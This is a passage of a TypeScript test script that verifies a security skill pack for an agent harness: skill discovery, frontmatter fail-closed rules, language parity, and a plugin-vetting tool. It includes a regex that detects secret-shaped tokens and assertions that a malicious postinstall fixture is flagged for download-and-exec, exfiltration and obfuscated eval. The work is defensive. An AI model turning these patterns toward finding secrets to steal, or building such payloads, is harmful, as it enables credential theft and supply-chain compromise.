/**
 * Headless verification for dsh-skill-pack-security.
 *
 * Drives the OFFICIAL @deepseek-ai/dsh-skill-filesystem parser and the REAL
 * `skill` tool from @deepseek-ai/dsh-tool-skill (both imported from the local
 * deepseek-harness checkout) against this pack's two language editions
 * (`skills/` Chinese and `skills-en/` English):
 *
 *   1. layout + kebab-case names + version/metadata sync + official/community
 *      name-conflict check (both language editions)
 *   2. registry discovery of all 8 skills through the official provider
 *      (per language edition)
 *   3. full-definition load via ctx.skills.get() (body, whenToUse, invocation,
 *      metadata, catalog-safe description length)
 *   4. the real `skill` tool via ctx.tools.execute() for all 8 skills
 *   5. the real model-facing session catalog (name + description only;
 *      whenToUse must NOT appear)
 *   6. 13 bad-frontmatter fixtures exercising the official fail-closed rules
 *   7. flat-file discovery, nested-dir exclusion, dir/frontmatter name mismatch
 *   8. the optional provider plugin (mount zh → mount en → dispose cleanly,
 *      misconfiguration fails loud)
 *   9. zh↔en structural parity (heading levels, code-fence count, reference
 *      file sets) so the editions cannot drift apart
 *   10. references wiring: every `references/<file>.md` mentioned by a
 *       SKILL.md exists, and every file under references/ is mentioned
 *   11. provider/package.json version syncs to the VERSION file
 *   12. installers/README document the official skill-root ranks (extracted
 *       from the checkout's skill-filesystem source)
 *   13. shell `grep -E` patterns stay POSIX-portable (no GNU-only escapes
 *       such as \s/\d/\w — BSD grep on macOS misreads them)
 *   14. the pack's own redaction grep finds no secret-looking text in its
 *       shipped content (the intentional FAKE example is allowlisted)
 *   15. the release-checklist batch command is UTF-8-safe on Windows
 *       PowerShell 5.1 (bare Get-Content/Set-Content would corrupt Chinese)
 *   16. plugin_vet registers on ctx.tools and passes the compliant fixture
 *   17. plugin_vet fails the no-license fixture and cites skill sections
 *   18. plugin_vet fails the malicious postinstall fixture (scripts/exfil/obfuscation)
 *   19. the gate blocks installation under policy deny
 *   20. the scan engine is zero-dependency (node: builtins and relative imports only)
 *   21. report redaction keeps secret-shaped fixture text out of rendered output
 *
 * Run: <checkout>\node_modules\.bin\tsx.CMD verify\verify-skill-pack.mts
 * Requires a local deepseek-harness checkout; the script resolves it relative
 * to its own location (Project/Plugins/<pack>/verify -> ../../../../).
 */

import assert from 'node:assert/strict'
import { existsSync } from 'node:fs'
import { mkdir, mkdtemp, readFile, realpath, readdir, rm, rmdir, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join, sep } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

// ---------------------------------------------------------------------------
// Resolve the harness checkout and import its official sources via file URLs
// (the pack lives outside the pnpm workspace, so bare specifiers would fail).
// Default: the pack's own location, four levels under the checkout
// (<harness>/Project/Plugins/<pack>/verify). Override with an absolute path
// via DSH_HARNESS_CHECKOUT (used by CI and any other layout).
// ---------------------------------------------------------------------------
const HARNESS = (() => {
  const override = process.env.DSH_HARNESS_CHECKOUT
  if (override) return pathToFileURL(override.endsWith(sep) ? override : `${override}${sep}`)
  return new URL('../../../../', import.meta.url)
})()
const harnessImport = (p: string) => import(new URL(p, HARNESS).href)

const { Context } = await harnessImport('vendor/cordis/src/index.ts')
const skillMod = await harnessImport('packages/skill/skill/src/index.ts')
const SkillRegistry = skillMod.default
const { isSkillName } = skillMod
const skillFilesystem = await harnessImport('packages/skill/skill-filesystem/src/index.ts')
const toolSkill = await harnessImport('packages/skill/tool-skill/src/index.ts')
const SystemPrompt = (await harnessImport('packages/core/system-prompt/src/index.ts')).default
const ToolRuntime = (await harnessImport('packages/core/tools/src/index.ts')).default
const agentMod = await harnessImport('packages/core/agent/src/index.ts')
const AgentRegistry = agentMod.default
const { agentEvents, Inbox } = agentMod
const { Session, SessionId } = await harnessImport('packages/core/session/src/index.ts')
// Dual-ruler brand: the pinned ref exports dsh-llm CallId, master renamed it
// to ToolCallId; see call-id.ts. Do not import either name from the harness.
const { CallId } = await import(new URL('./call-id.ts', import.meta.url).href)

// ---------------------------------------------------------------------------
const PACK_DIR = fileURLToPath(new URL('..', import.meta.url))
const SKILL_NAMES = ['dependency-audit', 'incident-response', 'prompt-injection-review', 'secret-scan', 'security-audit', 'supply-chain-review', 'threat-model', 'vuln-intel']

/** The pack's language editions: directory name and the language it holds. */
const LANGUAGE_ROOTS = [
  { dir: 'skills', language: 'zh' },
  { dir: 'skills-en', language: 'en' },
] as const

/** The single version source: every SKILL.md metadata.version must equal it. */
const VERSION = (await readFile(join(PACK_DIR, 'VERSION'), 'utf8')).trim()
const PACK_NAME = 'dsh-skill-pack-security'

// The official skill names are derived from the checkout itself (living
// check: upstream additions cannot silently collide with this pack).
const OFFICIAL_SKILLS = (await readdir(fileURLToPath(new URL('.agents/skills/', HARNESS)), { withFileTypes: true }))
  .filter(entry => entry.isDirectory())
  .map(entry => entry.name)
const COMMUNITY_SKILLS = [
  'dsh-write-plugin', 'dsh-test-plugin', 'dsh-plugin-dev', 'make-dsh-plugin',
  'find-plugins', 'mainline-compat',
]

let checks = 0
function check(name: string, fn: () => void | Promise<void>): () => Promise<void> {
  return async () => {
    await fn()
    checks += 1
    console.log(`[PASS] ${name}`)
  }
}

/** Minimal agent mock, mirroring the official tool-skill spec's agentForCwd. */
function agentForCwd(cwd: string) {
  const id = SessionId(`verify-${cwd.replace(/[^a-zA-Z0-9]/g, '-')}`)
  const session = Session.create(id, [], { version: 0, id, createdAt: 0, cwd })
  return {
    ctx: new Context(),
    id,
    options: {},
    session,
    inbox: new Inbox(session, { inserted: () => {}, discarded: () => {}, claimed: () => {} }),
    status: 'idle',
    send: () => {},
    followup: () => {},
    steer: () => {},
    inject: () => { throw new Error('step-boundary catalog must not use agent.inject()') },
    cancel() {},
    runMaintenance: task => task(new AbortController().signal),
    whenIdle: () => Promise.resolve(),
  }
}

const catalogMax = 500
const normalized = (s: string) => s.replaceAll(/\s+/g, ' ').trim()

/** Heading-level skeleton (h1-h3 markers) plus fenced-code-block count for one SKILL.md. */
function structureOf(raw: string): { levels: string[]; fences: number } {
  const levels = [...raw.matchAll(/^#{1,3} .*$/gm)].map(match => (match[0].match(/^#+/) ?? [''])[0])
  const fences = (raw.match(/^```/gm) ?? []).length
  return { levels, fences }
}

/** `references/<file>.md` tokens mentioned by a SKILL.md body. */
function referencedFiles(raw: string): string[] {
  return [...new Set([...raw.matchAll(/references\/([a-z0-9-]+\.md)/g)].map(match => match[1]))]
}

/** Single-quoted patterns of shell `grep -…E '…'` commands extracted from prose. */
function grepPatterns(raw: string): string[] {
  return [...raw.matchAll(/grep(?:\s+-\w+)*\s+-[A-Za-z]*E[A-Za-z]*\s+'([^']+)'/g)].map(match => match[1])
}

/** Concatenate every `.md` file under a directory (recursive). */
async function readMdFilesUnder(root: string): Promise<string> {
  const entries = await readdir(root, { recursive: true })
  let text = ''
  for (const entry of entries) {
    if (typeof entry !== 'string' || !entry.endsWith('.md')) continue
    text += await readFile(join(root, entry), 'utf8')
  }
  return text
}

async function main(): Promise<void> {
  const steps: Array<() => Promise<void>> = []

  // --- 1. layout, kebab-case, version/metadata sync --------------------------
  steps.push(check('layout: both language editions, 8 bundles each, versions synced to VERSION', async () => {
    const baseEntries = await readdir(PACK_DIR, { withFileTypes: true })
    const langDirs = baseEntries.filter(e => e.isDirectory() && (e.name === 'skills' || e.name === 'skills-en')).map(e => e.name)
    assert.deepEqual(langDirs.slice().sort(), ['skills', 'skills-en'], 'pack root must carry both skills/ and skills-en/')
    for (const { dir } of LANGUAGE_ROOTS) {
      const root = join(PACK_DIR, dir)
      const entries = await readdir(root, { withFileTypes: true })
      const dirs = entries.filter(e => e.isDirectory()).map(e => e.name)
      const files = entries.filter(e => !e.isDirectory()).map(e => e.name)
      assert.deepEqual(dirs.slice().sort(), [...SKILL_NAMES].sort(), `${dir} must contain exactly the ${SKILL_NAMES.length} skill bundles`)
      assert.deepEqual(files, [], `${dir} root must contain only skill directories`)
      for (const name of SKILL_NAMES) {
        assert.ok(isSkillName(name), `${name} must be kebab-case`)
        const skillMd = join(root, name, 'SKILL.md')
        const buffer = await readFile(skillMd)
        const raw = buffer.toString('utf8')
        assert.deepEqual([...buffer.subarray(0, 3)], [0x2d, 0x2d, 0x2d], `${dir}/${name}/SKILL.md must start with --- and carry no BOM (a BOM makes the official parser drop the skill)`)
        const lines = raw.split('\n').length
        assert.ok(lines <= 300, `${dir}/${name}/SKILL.md has ${lines} lines (> 300)`)
        const nameMatch = /^name:\s*([a-z0-9-]+)\s*$/m.exec(raw)
        assert.equal(nameMatch?.[1], name, `${dir}/${name}/SKILL.md frontmatter name must match dir name`)
        const refs = await readdir(join(root, name, 'references')).catch(() => [])
        assert.ok(refs.length >= 1, `${dir}/${name} must have at least one references file`)
        assert.match(raw, /references\//, `${dir}/${name}/SKILL.md must point into references/`)
        const versionMatch = /^\s*version:\s*['"]?([0-9]+\.[0-9]+\.[0-9]+)['"]?\s*$/m.exec(raw)
        assert.equal(versionMatch?.[1], VERSION, `${dir}/${name} metadata.version must equal the VERSION file (${VERSION})`)
        const packMatch = /^\s*pack:\s*([A-Za-z0-9-]+)\s*$/m.exec(raw)
        assert.equal(packMatch?.[1], PACK_NAME, `${dir}/${name} metadata.pack must be ${PACK_NAME}`)
      }
    }
  }))

  steps.push(check('name conflicts: no overlap with official/community skill names', () => {
    for (const name of SKILL_NAMES) {
      assert.ok(!OFFICIAL_SKILLS.includes(name), `${name} collides with an official skill`)
      assert.ok(!COMMUNITY_SKILLS.includes(name), `${name} collides with a community skill-pack name`)
    }
  }))

  // --- 2/3. official provider discovery + full loads (per language) ----------
  for (const { dir, language } of LANGUAGE_ROOTS) {
    const root = join(PACK_DIR, dir)

    steps.push(check(`registry discovery (${language}): all ${SKILL_NAMES.length} skills found via the official provider`, async () => {
      const ctx = new Context()
      await ctx.plugin(SkillRegistry)
      await ctx.plugin(skillFilesystem, {
        includeDefaultRoots: false,
        customSkillDirs: [root],
        watch: false,
        providerName: `verify-pack-${language}`,
      })
      const listed = await ctx.skills.list()
      assert.deepEqual(listed.map(s => s.name), [...SKILL_NAMES].sort())
      for (const summary of listed) {
        assert.equal(summary.provider, `verify-pack-${language}`)
        assert.equal(summary.source, 'custom')
        assert.deepEqual(summary.invocation, { modelInvocable: true, userInvocable: true })
        assert.ok(summary.whenToUse && summary.whenToUse.length > 20, `${summary.name} whenToUse missing`)
        assert.ok(summary.description.length <= catalogMax, `${summary.name} description would truncate in the catalog`)
      }
    }))

    steps.push(check(`full load (${language}): ctx.skills.get() returns bodies with metadata`, async () => {
      const ctx = new Context()
      await ctx.plugin(SkillRegistry)
      await ctx.plugin(skillFilesystem, {
        includeDefaultRoots: false,
        customSkillDirs: [root],
        watch: false,
        providerName: `verify-pack-${language}`,
      })
      for (const name of SKILL_NAMES) {
        const def = await ctx.skills.get(name)
        assert.ok(def, `${name} must load`)
        assert.equal(def.name, name)
        assert.ok(def.content.length > 500, `${name} body too small`)
        assert.deepEqual(def.metadata, { pack: PACK_NAME, version: VERSION }, `${name} metadata`)
        assert.ok(!normalized(def.description).includes(normalized(def.whenToUse!)), `${name}: description must not duplicate whenToUse`)
      }
    }))

    // --- 4/5. the real `skill` tool + real session catalog -------------------
    steps.push(check(`skill tool (${language}): ctx.tools.execute loads all ${SKILL_NAMES.length} skills`, async () => {
      const toolCtx = new Context()
      await toolCtx.plugin(SystemPrompt)
      await toolCtx.plugin(ToolRuntime)
      await toolCtx.plugin(AgentRegistry)
      await toolCtx.plugin(SkillRegistry)
      await toolCtx.plugin(skillFilesystem, {
        includeDefaultRoots: false,
        customSkillDirs: [root],
        watch: false,
        providerName: `verify-tool-${language}`,
      })
      await toolCtx.plugin(toolSkill)
      const agent = agentForCwd(PACK_DIR)
      const signal = new AbortController().signal
      assert.ok(toolCtx.tools.get('skill', agent), 'skill tool must be registered')
      for (const name of SKILL_NAMES) {
        const result = await toolCtx.tools.execute({
          signal,
          callId: CallId(`verify-${language}-${name}`),
          name: 'skill',
          arguments: { name },
          agent,
        })
        assert.equal(result.isError, false, `skill tool failed for ${name}`)
        const text = (result.content[0] as { text?: string })?.text ?? ''
        assert.ok(text.includes(`<skill_content name="${name}">`), `skill tool content missing ${name} frame`)
        assert.ok(text.includes('<skill_instructions>'))
        assert.ok(text.length > 500)
      }
      const unknown = await toolCtx.tools.execute({
        signal, callId: CallId(`verify-${language}-unknown`), name: 'skill', arguments: { name: 'does-not-exist' }, agent,
      })
      assert.equal(unknown.isError, true)
      const invalid = await toolCtx.tools.execute({
        signal, callId: CallId(`verify-${language}-invalid`), name: 'skill', arguments: { name: 'Bad_Name' }, agent,
      })
      assert.equal(invalid.isError, true)
    }))

    steps.push(check(`session catalog (${language}): name + description only, whenToUse excluded`, async () => {
      const toolCtx = new Context()
      await toolCtx.plugin(SystemPrompt)
      await toolCtx.plugin(ToolRuntime)
      await toolCtx.plugin(AgentRegistry)
      await toolCtx.plugin(SkillRegistry)
      await toolCtx.plugin(skillFilesystem, {
        includeDefaultRoots: false,
        customSkillDirs: [root],
        watch: false,
        providerName: `verify-catalog-${language}`,
      })
      await toolCtx.plugin(toolSkill)
      const agent = agentForCwd(PACK_DIR)
      const signal = new AbortController().signal
      const decision = await agentEvents(toolCtx, agent).waterfall(
        'agent/pre-step',
        { messages: [], turn: 1, step: 1, signal },
        () => Promise.resolve({ kind: 'enter', messages: [] }),
      )
      assert.equal(decision.kind, 'enter')
      const catalog = decision.messages.find(m => m.source?.kind === 'skill-catalog')
      assert.ok(catalog, 'catalog message must be published')
      const entries = catalog.source.entries
      assert.deepEqual(entries.map(e => e.name), [...SKILL_NAMES].sort())
      const rendered = JSON.stringify(decision.messages)
      for (const name of SKILL_NAMES) {
        assert.ok(rendered.includes(`- \`${name}\`: `), `catalog line missing for ${name}`)
      }
      for (const entry of entries) {
        assert.deepEqual(Object.keys(entry).sort(), ['description', 'name'])
      }
      for (const name of SKILL_NAMES) {
        const def = await toolCtx.skills.get(name)
        assert.ok(def?.whenToUse)
        assert.ok(!rendered.includes(def.whenToUse), `whenToUse of ${name} leaked into the model catalog`)
      }
    }))
  }

  // --- 6/7. bad-frontmatter fixtures against the official parser -------------
  steps.push(check('bad frontmatter: 13 fixtures exercise the official fail-closed rules', async () => {
    const fixtureRoot = await mkdtemp(join(tmpdir(), 'dsh-skill-fixtures-'))
    const write = async (p: string, body: string) => {
      await mkdir(dirname(p), { recursive: true })
      await writeFile(p, body)
    }
    try {
      await write(join(fixtureRoot, 'no-front/SKILL.md'), 'plain body without frontmatter\n')
      await write(join(fixtureRoot, 'no-name/SKILL.md'), '---\ndescription: only a description\n---\n\nbody\n')
      await write(join(fixtureRoot, 'no-desc/SKILL.md'), '---\nname: no-desc\n---\n\nbody\n')
      await write(join(fixtureRoot, 'Bad_Name/SKILL.md'), '---\nname: Bad_Name\ndescription: invalid name\n---\n\nbody\n')
      await write(join(fixtureRoot, 'legacy-camel/SKILL.md'), '---\nname: legacy-camel\ndescription: legacy key\ndisableModelInvocation: true\n---\n\nbody\n')
      await write(join(fixtureRoot, 'bad-bool/SKILL.md'), '---\nname: bad-bool\ndescription: bad bool\ndisable-model-invocation: maybe\n---\n\nbody\n')
      await write(join(fixtureRoot, 'wrong-when/SKILL.md'), '---\nname: wrong-when\ndescription: wrong whenToUse type\nwhenToUse: 42\n---\n\nbody\n')
      await write(join(fixtureRoot, 'bad-metadata/SKILL.md'), '---\nname: bad-metadata\ndescription: bad metadata\nmetadata: [1, 2]\n---\n\nbody\n')
      await write(join(fixtureRoot, 'yes-form/SKILL.md'), '---\nname: yes-form\ndescription: yes form\ndisable-model-invocation: yes\n---\n\nbody\n')
      await write(join(fixtureRoot, 'off-form/SKILL.md'), '---\nname: off-form\ndescription: off form\nuser-invocable: off\n---\n\nbody\n')
      await write(join(fixtureRoot, 'flat.md'), '---\nname: flat\ndescription: flat file skill\n---\n\nflat body\n')
      await write(join(fixtureRoot, 'nested/extra/SKILL.md'), '---\nname: nested-deep\ndescription: must not be discovered\n---\n\nbody\n')
      await write(join(fixtureRoot, 'mismatch/SKILL.md'), '---\nname: renamed-front\ndescription: frontmatter name wins\n---\n\nbody\n')

      const fixtureCtx = new Context()
      await fixtureCtx.plugin(SkillRegistry)
      await fixtureCtx.plugin(skillFilesystem, {
        includeDefaultRoots: false,
        customSkillDirs: [fixtureRoot],
        watch: false,
        providerName: 'verify-fixtures',
      })

      const listed = await fixtureCtx.skills.list()
      assert.deepEqual(listed.map(s => s.name), ['bad-metadata', 'flat', 'off-form', 'renamed-front', 'wrong-when', 'yes-form'])

      // fail-closed: dropped entirely
      for (const dropped of ['no-front', 'no-name', 'no-desc', 'Bad_Name', 'legacy-camel', 'bad-bool', 'nested-deep']) {
        assert.ok(!listed.some(s => s.name === dropped), `${dropped} must be dropped`)
        assert.equal(await fixtureCtx.skills.get(dropped), undefined)
      }
      // nested one-level-deeper SKILL.md is outside discovery
      assert.ok(!listed.some(s => s.name === 'mismatch'))

      // wrong-typed optional fields are omitted, skill still loads
      const wrongWhen = await fixtureCtx.skills.get('wrong-when')
      assert.equal(wrongWhen?.whenToUse, undefined)
      const badMetadata = await fixtureCtx.skills.get('bad-metadata')
      assert.equal(badMetadata?.metadata, undefined)

      // case-insensitive boolean forms resolve
      assert.deepEqual((await fixtureCtx.skills.get('yes-form'))?.invocation, { modelInvocable: false, userInvocable: true })
      assert.deepEqual((await fixtureCtx.skills.get('off-form'))?.invocation, { modelInvocable: true, userInvocable: false })

      // flat file format discovered; frontmatter name wins over dir name
      assert.equal((await fixtureCtx.skills.get('flat'))?.content, 'flat body')
      assert.equal((await fixtureCtx.skills.get('mismatch')), undefined)
      assert.equal((await fixtureCtx.skills.get('renamed-front'))?.content, 'body')
    } finally {
      await rm(fixtureRoot, { recursive: true, force: true })
    }
  }))

  // --- 8. optional provider plugin -------------------------------------------
  steps.push(check('provider plugin: mounts zh/en editions, registers plugin_vet, disposes cleanly, misconfiguration fails loud', async () => {
    // The pack sits outside the pnpm workspace, so give the plugin's bare
    // imports a resolution shim (junctions into the harness packages).
    const shimBase = join(PACK_DIR, 'node_modules', '@deepseek-ai')
    await mkdir(shimBase, { recursive: true })
    const resolverBase = join(fileURLToPath(HARNESS), 'packages/skill/skill-filesystem/node_modules/@deepseek-ai')
    const links: Array<[string, string]> = [
      ['dsh-skill-filesystem', join(fileURLToPath(HARNESS), 'packages/skill/skill-filesystem')],
      ['dsh-tools', join(fileURLToPath(HARNESS), 'packages/core/tools')],
      ['schemastery', await realpath(join(resolverBase, 'schemastery'))],
    ]
    for (const [pkg, target] of links) {
      const dest = join(shimBase, pkg)
      try {
        await symlink(target, dest, process.platform === 'win32' ? 'junction' : 'dir')
      } catch {
        // already present from a previous run
      }
    }
    try {
      const providerPlugin = await import(new URL('../provider/src/index.ts', import.meta.url).href)
      assert.equal(providerPlugin.name, 'skill-pack-security')
      assert.deepEqual(providerPlugin.inject, ['skills', 'tools'])

      /** Mount a full context with both services the provider injects. */
      async function mountPlugin(config: Record<string, unknown> = {}) {
        const ctx = new Context()
        await ctx.plugin(SystemPrompt)
        await ctx.plugin(ToolRuntime)
        await ctx.plugin(AgentRegistry)
        await ctx.plugin(SkillRegistry)
        const fiber = await ctx.plugin(providerPlugin, config)
        return { ctx, fiber }
      }

      // Default mount publishes the Chinese edition.
      const { ctx: zhCtx, fiber: zhFiber } = await mountPlugin()
      const zhListed = await zhCtx.skills.list()
      assert.deepEqual(zhListed.map(s => s.name), [...SKILL_NAMES].sort())
      for (const s of zhListed) assert.equal(s.provider, 'skill-pack-security')
      const zhSpec = await zhCtx.skills.get('security-audit')
      assert.ok(zhSpec?.content.includes('安全审计总览'), 'default mount must publish the Chinese edition')
      assert.ok(zhCtx.tools.get('plugin_vet', agentForCwd(PACK_DIR)), 'plugin_vet tool must be registered')

      await zhFiber.dispose()
      assert.deepEqual((await zhCtx.skills.list()).map(s => s.name), [])

      // `language: en` mounts the English edition instead.
      const { ctx: enCtx, fiber: enFiber } = await mountPlugin({ language: 'en' })
      const enListed = await enCtx.skills.list()
      assert.deepEqual(enListed.map(s => s.name), [...SKILL_NAMES].sort())
      for (const s of enListed) assert.equal(s.provider, 'skill-pack-security')
      const enSpec = await enCtx.skills.get('security-audit')
      assert.ok(enSpec?.content.includes('Security audit overview'), 'language: en must publish the English edition')

      await enFiber.dispose()
      assert.deepEqual((await enCtx.skills.list()).map(s => s.name), [])

      // Misconfiguration fails loud: an empty or nonexistent skillsDir must
      // reject at apply time instead of mounting zero skills.
      await assert.rejects(
        async () => { await zhCtx.plugin(providerPlugin, { skillsDir: '' }) },
        /skill-pack-security|skillsDir/i,
        'empty skillsDir must be rejected',
      )
      await assert.rejects(
        async () => { await zhCtx.plugin(providerPlugin, { skillsDir: join(PACK_DIR, 'no-such-dir') }) },
        /does not exist or contains no/,
        'nonexistent skillsDir must be rejected with an actionable message',
      )
      // An explicit valid root still mounts.
      const explicitCtx = new Context()
      await explicitCtx.plugin(SystemPrompt)
      await explicitCtx.plugin(ToolRuntime)
      await explicitCtx.plugin(AgentRegistry)
      await explicitCtx.plugin(SkillRegistry)
      const explicitFiber = await explicitCtx.plugin(providerPlugin, { skillsDir: join(PACK_DIR, 'skills-en') })
      const explicitListed = await explicitCtx.skills.list()
      assert.equal(explicitListed.length, SKILL_NAMES.length)
      for (const s of explicitListed) assert.equal(s.provider, 'skill-pack-security')
      const explicitSpec = await explicitCtx.skills.get('security-audit')
      assert.ok(explicitSpec?.content.includes('Security audit overview'), 'explicit skillsDir must publish that root')
      await explicitFiber.dispose()
    } finally {
      // Remove only the shim links this run created; leave any real
      // node_modules content in the pack directory untouched.
      for (const [pkg] of links) await rm(join(shimBase, pkg), { force: true })
      await rmdir(shimBase).catch(() => {})
      await rmdir(join(PACK_DIR, 'node_modules')).catch(() => {})
    }
  }))

  // --- 9. zh↔en structural parity ---------------------------------------------
  steps.push(check('zh↔en parity: heading levels, fence counts, and reference sets match', async () => {
    for (const name of SKILL_NAMES) {
      const zh = await readFile(join(PACK_DIR, 'skills', name, 'SKILL.md'), 'utf8')
      const en = await readFile(join(PACK_DIR, 'skills-en', name, 'SKILL.md'), 'utf8')
      assert.deepEqual(structureOf(zh), structureOf(en), `${name}: zh/en structure diverged`)
      assert.deepEqual(referencedFiles(zh).sort(), referencedFiles(en).sort(), `${name}: zh/en reference wiring diverged`)
    }
  }))

  // --- 10. references wiring ---------------------------------------------------
  steps.push(check('references wiring: every mentioned file exists, no orphan files', async () => {
    for (const { dir } of LANGUAGE_ROOTS) {
      for (const name of SKILL_NAMES) {
        const raw = await readFile(join(PACK_DIR, dir, name, 'SKILL.md'), 'utf8')
        const mentioned = referencedFiles(raw)
        const present = await readdir(join(PACK_DIR, dir, name, 'references')).catch(() => [])
        for (const file of mentioned) {
          assert.ok(present.includes(file), `${dir}/${name} mentions missing references/${file}`)
        }
        for (const file of present) {
          assert.ok(mentioned.includes(file), `${dir}/${name}/references/${file} is never mentioned by SKILL.md`)
        }
      }
    }
  }))

  // --- 11. provider version sync -----------------------------------------------
  steps.push(check('provider version: package.json syncs to the VERSION file', async () => {
    const pkg = JSON.parse(await readFile(join(PACK_DIR, 'provider', 'package.json'), 'utf8'))
    assert.equal(pkg.version, VERSION, `provider/package.json version ${pkg.version} must equal VERSION (${VERSION})`)
  }))

  // --- 12. documented ranks vs official constants -------------------------------
  steps.push(check('rank docs: installers and README match the official skill-root ranks', async () => {
    const fsSource = await readFile(fileURLToPath(new URL('packages/skill/skill-filesystem/src/index.ts', HARNESS)), 'utf8')
    const ranks: Record<string, string> = {}
    for (const match of fsSource.matchAll(/const ([A-Z_]+_RANK) = (\d+)/g)) {
      ranks[match[1]] = match[2]
    }
    const expected = {
      PROJECT_DSH_RANK: '100',
      PROJECT_AGENTS_RANK: '200',
      CUSTOM_RANK: '300',
      USER_DSH_RANK: '400',
      USER_AGENTS_RANK: '500',
    } as const
    for (const [key, value] of Object.entries(expected)) {
      assert.equal(ranks[key], value, `upstream ${key} changed: update this pack's rank documentation`)
    }
    const readme = await readFile(join(PACK_DIR, 'README.md'), 'utf8')
    const ps1 = await readFile(join(PACK_DIR, 'scripts', 'install.ps1'), 'utf8')
    const sh = await readFile(join(PACK_DIR, 'scripts', 'install.sh'), 'utf8')
    for (const value of [expected.PROJECT_DSH_RANK, expected.PROJECT_AGENTS_RANK, expected.USER_DSH_RANK, expected.USER_AGENTS_RANK]) {
      for (const [label, text] of [['install.ps1', ps1], ['install.sh', sh]] as const) {
        assert.ok(text.includes(`rank ${value}`), `${label} must document rank ${value}`)
      }
    }
    assert.ok(ps1.includes('custom 300') && sh.includes('custom 300'), 'installers must note the custom rank 300')
    assert.ok(
      readme.includes(`project-dsh 100 < project-agents 200 < custom 300 < user-dsh 400 < user-agents 500`),
      'README.md must document the full rank chain including custom 300',
    )
  }))

  // --- 13. grep portability ------------------------------------------------------
  steps.push(check('grep portability: no GNU-only escapes in shell grep -E patterns', async () => {
    const ban = /\\[sSdDwWbB]|\(\?/
    for (const { dir } of LANGUAGE_ROOTS) {
      for (const name of SKILL_NAMES) {
        const paths = [
          join(PACK_DIR, dir, name, 'SKILL.md'),
          ...(await readdir(join(PACK_DIR, dir, name, 'references'))).map(file => join(PACK_DIR, dir, name, 'references', file)),
        ]
        for (const path of paths) {
          const raw = await readFile(path, 'utf8')
          for (const pattern of grepPatterns(raw)) {
            const where = path.replace(`${PACK_DIR}${sep}`, '')
            assert.ok(!ban.test(pattern), `${where}: GNU-only escape in grep -E pattern '${pattern}' (BSD grep on macOS misreads it)`)
          }
        }
      }
    }
  }))

  // --- 14. secret self-check -------------------------------------------------------
  steps.push(check('secret self-check: no secret-shaped text in shipped content', async () => {
    const redaction = /ghp_[A-Za-z0-9]{36}|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20}|-----BEGIN (RSA|OPENSSH|EC) /g
    let text = await readFile(join(PACK_DIR, 'README.md'), 'utf8')
    for (const root of [join(PACK_DIR, 'skills'), join(PACK_DIR, 'skills-en'), join(PACK_DIR, 'docs')]) {
      text += await readMdFilesUnder(root)
    }
    for (const match of text.matchAll(redaction)) {
      // The intentional gitleaks-gate example uses an obviously fake key.
      assert.ok(match[0].includes('FAKE'), `secret-shaped text in shipped content: ${match[0].slice(0, 24)}…`)
    }
  }))

  // --- 15. release-checklist UTF-8 safety ---------------------------------------------
  steps.push(check('release-checklist: batch version command writes BOM-less UTF-8 for Windows PowerShell 5.1', async () => {
    const text = await readFile(join(PACK_DIR, 'docs', 'release-checklist.md'), 'utf8')
    assert.ok(text.includes('Get-Content $_.FullName -Raw -Encoding UTF8'), 'batch command must read with -Encoding UTF8')
    assert.ok(text.includes('UTF8Encoding($false)'), 'batch command must construct a BOM-less UTF8 encoding')
    assert.ok(text.includes('[System.IO.File]::WriteAllText'), 'batch command must write via .NET WriteAllText (Set-Content -Encoding UTF8 adds a BOM on PS 5.1)')
  }))

  // --- 16-19. plugin_vet tool through the real ToolRuntime ----------------------
  const VET_FIXTURES = join(PACK_DIR, 'verify', 'fixtures', 'vet')

  /** Mount the provider with the real tools runtime and execute plugin_vet once. */
  async function vetOnce(args: Record<string, unknown>, config: Record<string, unknown> = { language: 'en' }): Promise<string> {
    const ctx = new Context()
    await ctx.plugin(SystemPrompt)
    await ctx.plugin(ToolRuntime)
    await ctx.plugin(AgentRegistry)
    await ctx.plugin(SkillRegistry)
    const providerPluginForVet = await import(new URL('../provider/src/index.ts', import.meta.url).href)
    await ctx.plugin(providerPluginForVet, config)
    const agent = agentForCwd(PACK_DIR)
    assert.ok(ctx.tools.get('plugin_vet', agent), 'plugin_vet tool must be registered')
    const result = await ctx.tools.execute({
      signal: new AbortController().signal,
      callId: CallId(`verify-vet-${Math.random().toString(36).slice(2)}`),
      name: 'plugin_vet',
      arguments: args,
      agent,
    })
    assert.equal(result.isError, false, `plugin_vet failed: ${(result.content[0] as { text?: string })?.text ?? JSON.stringify(result.content)}`)
    return (result.content[0] as { text?: string })?.text ?? ''
  }

  steps.push(check('plugin_vet (tool): registers on ctx.tools and passes the compliant fixture', async () => {
    const text = await vetOnce({ target: join(VET_FIXTURES, 'clean') })
    assert.match(text, /Verdict: PASS/, 'clean fixture must yield PASS')
    assert.match(text, /MIT is a common SPDX id/, 'license check must run')
    assert.match(text, /`supply-chain-review §1`/, 'findings must cite skill sections')
  }))

  steps.push(check('plugin_vet (tool): fails the no-license fixture and cites skills for the follow-up audit', async () => {
    const text = await vetOnce({ target: join(VET_FIXTURES, 'no-license') })
    assert.match(text, /Verdict: FAIL/, 'no-license fixture must yield FAIL')
    assert.match(text, /No license at all/, 'license check must flag the missing license')
    assert.match(text, /`dependency-audit §3`/, 'license finding must cite dependency-audit §3')
    assert.match(text, /Gate warning/, 'warn policy must surface the gate warning')
    assert.match(text, /not a pinned 40-hex commit/, 'unpinned workflow action must be flagged')
  }))

  steps.push(check('plugin_vet (tool): fails the malicious postinstall fixture (scripts/exfil/obfuscation)', async () => {
    const text = await vetOnce({ target: join(VET_FIXTURES, 'postinstall') })
    assert.match(text, /Verdict: FAIL/, 'postinstall fixture must yield FAIL')
    assert.match(text, /downloads executable content and runs it/, 'postinstall download+exec must be flagged')
    assert.match(text, /data-exfiltration indicator/, 'receiver domain must be flagged')
    assert.match(text, /dynamic eval \+ encoded payload/, 'obfuscated eval payload must be flagged')
    assert.match(text, /`supply-chain-review §1`/, 'script findings must cite supply-chain-review §1')
  }))

  steps.push(check('plugin_vet (gate): deny policy blocks installation on FAIL', async () => {
    const text = await vetOnce({ target: join(VET_FIXTURES, 'no-license'), policy: 'deny' })
    assert.match(text, /Verdict: FAIL/)
    assert.match(text, /Gate DENY/, 'deny policy must block the install')
  }))

  // --- 20. zero-dependency scan engine -----------------------------------------
